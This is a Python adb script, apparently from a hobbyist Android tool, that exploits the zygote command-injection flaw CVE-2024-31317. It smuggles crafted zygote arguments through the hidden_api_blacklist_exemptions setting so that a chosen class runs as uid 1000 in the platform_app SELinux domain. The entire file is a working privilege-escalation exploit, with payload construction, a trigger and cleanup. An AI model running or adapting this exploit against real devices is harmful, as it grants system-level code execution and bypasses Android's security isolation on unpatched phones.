#!/usr/bin/env python3
"""
inject.py - start one of the nvptool classes inside a platform_app context.

Why this is needed
------------------
IProperties is only reachable from domains that SELinux grants
`hwservice_manager find` on `properties_hwservice`: platform_app, priv_app,
system_app. A normal sideloaded app is `untrusted_app` and is denied.

This script uses the publicly documented Android zygote vulnerability
CVE-2024-31317 (an unvalidated zygote command line smuggled through the
`hidden_api_blacklist_exemptions` setting) to spawn `app_process` with a
chosen uid and SELinux seinfo. It is a convenience wrapper only; it contains
no vendor code. Use at your own risk, and prefer a patched device.

Usage
-----
    python3 tools/inject.py org.maniac79.nvptool.Read   org.maniac79.nvptool
    python3 tools/inject.py org.maniac79.nvptool.Apply  org.maniac79.nvptool
    python3 tools/inject.py org.maniac79.nvptool.Rollback org.maniac79.nvptool

The vendor HAL APK is appended to CLASSPATH so that the Java stub
`izm.android.properties.V1_0.IProperties` resolves without any Sony code
being bundled in this repository.
"""
import argparse
import subprocess
import sys
import time

HAL_APK = "/system_ext/priv-app/IzmAudioManager/IzmAudioManager.apk"
LOG_TAG = "NVPTOOL"
REMOTE_PAYLOAD = "/data/local/tmp/nvptool_payload.txt"


def adb(*args, **kwargs):
    return subprocess.run(["adb", *args], capture_output=True, **kwargs)


def shell(cmd):
    return adb("shell", cmd)


def on_device_file(path):
    r = adb("shell", "cat %s" % path)
    return r.stdout.decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser(description="Spawn an nvptool class via CVE-2024-31317.")
    ap.add_argument("class_name", help="e.g. org.maniac79.nvptool.Read")
    ap.add_argument("package", help="installed package holding the class, e.g. org.maniac79.nvptool")
    ap.add_argument("--uid", default="1000", help="uid to run as (default 1000 = system)")
    ap.add_argument("--seinfo", default="platform:targetSdkVersion=29:complete",
                    help="seinfo that maps to domain platform_app")
    ap.add_argument("--hal", default=HAL_APK, help="vendor HAL apk appended to CLASSPATH")
    ap.add_argument("--wait", type=float, default=8.0, help="seconds to wait for the payload")
    args = ap.parse_args()

    # sanity checks
    state = adb("get-state").stdout.decode().strip()
    if state != "device":
        sys.exit("adb device not ready (state=%r)" % state)

    model = shell("getprop ro.product.model").stdout.decode().strip()
    print("device model:", model)

    r = shell("pm path %s" % args.package)
    if b"package:" not in r.stdout:
        sys.exit("package %s is not installed - run: adb install -r out/nvptool.apk"
                 % args.package)
    apk = r.stdout.decode().strip().split(":", 1)[1].strip()

    if adb("shell", "test -r %s" % args.hal).returncode != 0:
        sys.exit("cannot read HAL apk at %s" % args.hal)

    classpath = "%s:%s" % (apk, args.hal)

    # zygote arguments (the trailing '#' comments out the rest of the line)
    cmd = "CLASSPATH=%s /system/bin/app_process /system/bin %s #" % (classpath, args.class_name)
    zygote_args = [
        "--setuid=%s" % args.uid,
        "--setgid=%s" % args.uid,
        "--setgroups=3003",
        "--runtime-args",
        "--seinfo=%s" % args.seinfo,
        "--runtime-flags=1",
        "--nice-name=nvptool",
        "--invoke-with", cmd,
    ]

    payload = "LClass1;->method1(\n" + str(len(zygote_args)) + "\n" + "\n".join(zygote_args)

    with open("/tmp/nvptool_payload.txt", "w") as fh:
        fh.write(payload)

    adb("push", "/tmp/nvptool_payload.txt", REMOTE_PAYLOAD)
    adb("shell", "logcat -c")
    adb("shell", "am force-stop com.android.settings")
    adb("shell", 'settings put global hidden_api_blacklist_exemptions "$(cat %s)"' % REMOTE_PAYLOAD)
    time.sleep(1)
    adb("shell", "am start -a android.settings.SETTINGS")
    time.sleep(args.wait)

    out = adb("shell", "logcat -b all -d").stdout.decode("utf-8", "replace")
    lines = [ln for ln in out.splitlines() if LOG_TAG in ln]
    if lines:
        for ln in lines:
            print(ln)
    else:
        print("(no %s output - the spawn is flaky, just run the command again)" % LOG_TAG)

    # always leave the device clean
    adb("shell", "settings delete global hidden_api_blacklist_exemptions")
    adb("shell", "rm -f %s" % REMOTE_PAYLOAD)

    if not lines:
        sys.exit(2)


if __name__ == "__main__":
    main()
